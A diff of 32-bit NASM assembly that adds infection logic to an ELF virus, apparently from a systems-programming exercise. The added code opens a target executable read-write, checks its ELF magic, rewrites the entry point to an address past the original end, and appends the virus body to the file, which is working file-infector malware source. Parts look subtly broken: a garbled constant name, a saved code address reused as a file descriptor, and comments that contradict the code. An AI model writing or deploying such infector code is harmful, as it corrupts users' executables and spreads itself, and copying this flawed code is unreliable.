@@ -46,7 +46,7 @@
 %define PHDR_start	28
 %define	PHDR_size	32
 %define PHDR_memsize	20	
-%define PHDR_filesize	16
+%define PHDR_filedxze	16
 %define	PHDR_offset	4
 %define	PHDR_vaddr	8
 %define ELFHDR_size 52
@@ -60,21 +60,44 @@ _start:
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 	;CODE START
-	open FileName, 0, 0111 		; open FileName with readonly and 111 permissions  (read)
-	cmp eax, 0
+	open FileName, 2, 0777 		; open FileName with readonly and 111 permissions  (read)
+	mov esi, eax				; save fd in edx
+	cmp esi, 0
 	jl _print_failure
-	read eax, esp, 4			; read first 4 bytes into esp (reserved place)
+	read esi, esp, 4			; read first 4 bytes into esp (reserved place)
 	cmp dword [esp], 0x464c457f ;cmp STK_RES to elf magic bytes
 	jne _print_failure
 	;now we should write the code from _start to virus_end
 	call get_my_loc				;now ecx holds location for next_i
 	add ecx, next_i-_start		;add ecx the offset from next_i to _start, now ecx points at _start address
-	lseek eax, 0, SEEK_END		;jump with the ELF file descriptor to it's end
-	write eax, ecx, virus_end-_start
+	mov dword [esp], ecx		;save _start address at [esp]
+	
+	;get infected file size using lseek
+	lseek esi, 0, SEEK_END		;jump with the ELF file descriptor to it's end
+	mov dword [esp+4], eax		; save file length in [esp+4]
+	
+	;now we should find the virt address the elf file is being read to
+	;using go to ph_section->ph_viruaddress
+	mov ebx, ELF_HEADER+PHDR_start 		 ; load into ebx Address of first entry
+	add ebx, PHDR_size					 ; load into ebx Address of second entry
+	add ebx, PHDR_vaddr
+	lseek dword [esp], ebx, SEEK_SET
+	read dword [esp], [esp+8], 4		; read 4 bytes of the file's va into [esp+8]
+	mov edx, [esp+8]					; load the address into edx
+	add edx, [esp+4]					; add the file length into va
+	mov [esp+12], edx
+	;now edx is the value we want to put in the entry point
+	mov eax, eax						; flag for debug - so it'll be easy to find the line
+	lseek dword [esp], ENTRY, SEEK_SET	; set fd pointer to entry point
+	write dword [esp], dword [esp+12], 4	;set entry point to the infected code
 
-	;now we should override the entry point with our _start address, which is held in ecx
-	lseek eax, 25, SEEK_SET		;move fd pointer to the entry point
-	write eax, ecx, 4			;write new entry point
+
+	lseek esi, 0, SEEK_END		;jump with the ELF file descriptor to it's end
+	mov ecx, dword [esp]
+	write esi, ecx, virus_end-_start
+	
+	close esi
+	jmp VirusExit
 	
 	_print_failure:
 		write 1, Failstr, 13 
